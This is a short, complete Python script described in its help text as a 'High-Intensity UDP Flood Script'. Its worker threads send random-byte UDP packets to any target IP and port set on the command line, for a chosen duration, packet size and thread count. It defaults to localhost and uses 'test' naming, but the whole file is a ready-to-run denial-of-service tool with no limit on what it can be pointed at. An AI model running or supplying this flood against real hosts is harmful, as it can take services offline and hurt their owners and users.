import argparse
import socket
import time
import random
import threading

def attack_worker(target_ip, target_port, duration, packet_size, stop_event):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload = random.randbytes(packet_size)
    
    while not stop_event.is_set():
        try:
            sock.sendto(payload, (target_ip, target_port))
        except:
            break

def run_test(target_ip, target_port, duration, packet_size, threads_count):
    print(f"Starting Multi-threaded UDP Flood...")
    print(f"Target: {target_ip}:{target_port} | Threads: {threads_count} | Duration: {duration}s")
    
    stop_event = threading.Event()
    threads = []
    
    for _ in range(threads_count):
        t = threading.Thread(target=attack_worker, args=(target_ip, target_port, duration, packet_size, stop_event))
        t.start()
        threads.append(t)
    
    time.sleep(duration)
    stop_event.set()
    
    for t in threads:
        t.join()
    print("\nTest complete!")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="High-Intensity UDP Flood Script")
    parser.add_argument("--target", type=str, default="127.0.0.1", help="Target IP")
    parser.add_argument("--port", type=int, default=80, help="Target port")
    parser.add_argument("--duration", type=int, default=15, help="Duration (sec)")
    parser.add_argument("--size", type=int, default=1024, help="Packet size")
    parser.add_argument("--threads", type=int, default=4, help="Number of threads")
    
    args = parser.parse_args()
    run_test(args.target, args.port, args.duration, args.size, args.threads)
